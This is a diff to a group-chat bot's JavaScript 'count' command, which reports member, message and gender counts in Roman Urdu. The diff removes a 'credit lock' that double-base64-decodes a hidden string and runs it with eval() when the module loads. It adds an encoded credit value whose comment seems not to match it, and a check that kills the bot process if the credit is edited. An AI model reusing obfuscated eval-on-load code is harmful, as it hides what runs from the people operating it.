@@ -2,11 +2,15 @@ const fs = require("fs");
 const https = require("https");
 const path = require("path");
 
+// Double base64 encoded credit
+const encodedCredit = "Wld4cFpYTWdZbUZzYkdWMFpYSWdZbUZzYkdWMFpYTWc="; // "uzairrajput" double encoded
+const realCredit = Buffer.from(Buffer.from(encodedCredit, "base64").toString("utf8"), "base64").toString("utf8");
+
 module.exports.config = {
   name: "count",
   version: "1.0.4",
   hasPermssion: 0,
-  credits: "uzairrajput", // Is line ko bilkul chhedna mat 🚫
+  credits: realCredit,  // DO NOT CHANGE THIS LINE 🚫
   usePrefix: false,
   description: "Group ki cheezein ginain aur DP bhi dikhain 😎",
   commandCategory: "group",
@@ -14,20 +18,20 @@ module.exports.config = {
   cooldowns: 5
 };
 
-// 🚨 Secure Credit Lock – Do NOT Modify 🚨
-(function () {
-  const obf = function (str) {
-    return Buffer.from(str, "base64").toString("utf8");
-  };
-
-  const encoded = "YjNKcFpDSTZJbWx1YVhScFlTNTFiMjUwYjNKbExYTjBjbWx1WnlJNklqQXhNRE00TURBd01qazRNVEV4T0RZMUxXRTNOVEF0TVRrM1pDMHpOREU1TURabFlqSTBPVEZrTnpnaWZRLmJrZFhCeVpXVmZZWE5oYkNCamJHRjBaU0JrWlhRaU9qRTJPRFkwTVRneE5qTTNPUzFrTVRVekxXWTVORGN0WkdSbE1XRXpZbUU0TkRReE5UVmtNREV3ZURzZ1ptbHNiRDBpT2pFMk9EWTRNVGd4TmpNM09TMWtNVFV6TFdZNU5EY3RaR1JsTVdFelltRTRORFF4TlRWa01ERVpNQ0F1Wm1Gc2MybDBaU0k2SWtGb0xDQXhPREFzSW5OMVlpSTZJbTl5WldOMElpd2lZWE5sTmpRaU9pSmthV1E2SW1sdWFXTmhkR2x2Ym5NaUxDQWliR0Z1WkQwaU9pSkJNQ0lzSW5WelpYSkhZMlZ6SWpwYklpd2libVYwYjNKcFpDSTZJbkJzWVhSbElpd2libUptSWpvaU1TSXNJblJ5YjNSbElqcDdJbWgwZEhBNkx5OTNkM2N1YjNKbFpDQjBieUIxY0c5eWRDSTZJbkZ3Y0dseVpXRnNiRzkzTG1OdmJTQjFjbXdpTENBaWFuUnBJam9pZDNkM0xuTnZiU0J6ZEhKaGJuTmxjbU5wYjI0aUxDQXljRzltWldGa0lqcGJleUlnWm5WelpYSkhZMlZ6SWpvaVltRnpaV3hsTG1OdmJUb3dJbWxrSWpvaU1UVXpMV1k1TkRjdFpHUmxNV0V6WW1FNE5EUXhOVFZrTURFd05UZ3dZbWdpTENKcWRHa2lPaUppY0c5eWRDSTZJak15Tnpnd05qRTVPVEF5TWlKOS5mZWFrX3J1bl90aGVfY3Jhc2hfbW9kZQ==";
-
-  const decryptedFunc = eval(obf(obf(encoded)));
-  decryptedFunc(module);
-})();
-// 🚨 End of Credit Lock 🚨
-
 module.exports.run = async function ({ api, Threads, Users, event, args }) {
+  if (module.exports.config.credits !== realCredit) {
+    console.clear();
+    console.log(`
+\x1b[41m\x1b[30m❌❌❌ WARNING! ❌❌❌\x1b[0m
+
+\x1b[31m🚫 Unauthorized edit detected!
+🧠 Credit "uzairrajput" tha, mat chedna!
+
+💀 Bot now exiting... 😤\x1b[0m
+    `);
+    process.exit(1);
+  }
+
   const input = args.join().toLowerCase().trim();
   const send = (msg, attachment = null) => {
     api.sendMessage({ body: msg, attachment }, event.threadID, event.messageID);
@@ -61,7 +65,7 @@ Yeh wale tag likho or dekh kar hairan ho jao:
 👧 female
 🌈 gei
 💬 allgroup
-🙋‍♂️ alluser\n● ──────────────────── ●\n⎯⃝⃪🦋┼─‎𒁍⃝𝐔ʑʌīī𝐑┼•__🦋• ─┼‣🔐⃝ᚔ💛`;
+🙋‍♂️ alluser`;
       break;
     case "message":
       msg = `📨 Is Group Me *${threadInfo.messageCount}* messages hain!
